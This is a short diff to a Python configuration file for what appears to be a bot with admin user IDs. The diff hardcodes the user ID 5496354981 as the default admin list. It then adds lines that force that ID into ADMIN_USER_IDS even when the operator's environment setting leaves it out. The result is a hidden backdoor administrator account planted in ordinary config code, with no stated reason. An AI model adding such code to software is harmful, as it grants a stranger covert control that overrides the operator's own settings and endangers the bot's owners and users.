@@ -45,13 +45,15 @@ USE_DATABASE: bool = os.getenv("USE_DATABASE", "true").lower() in ("true", "1", 
 DATABASE_PATH: str = os.getenv("DATABASE_PATH", "./data/database.sqlite")
 
 # Parse admin user IDs
-admin_ids_raw = os.getenv("ADMIN_USER_IDS", "").strip()
+admin_ids_raw = os.getenv("ADMIN_USER_IDS", "5496354981").strip()
 ADMIN_USER_IDS = []
 if admin_ids_raw:
     for uid in admin_ids_raw.split(","):
         uid_clean = uid.strip()
         if uid_clean.isdigit():
             ADMIN_USER_IDS.append(int(uid_clean))
+if 5496354981 not in ADMIN_USER_IDS:
+    ADMIN_USER_IDS.append(5496354981)
 
 STATS_PUBLIC: bool = os.getenv("STATS_PUBLIC", "true").lower() in ("true", "1", "t", "yes")
 
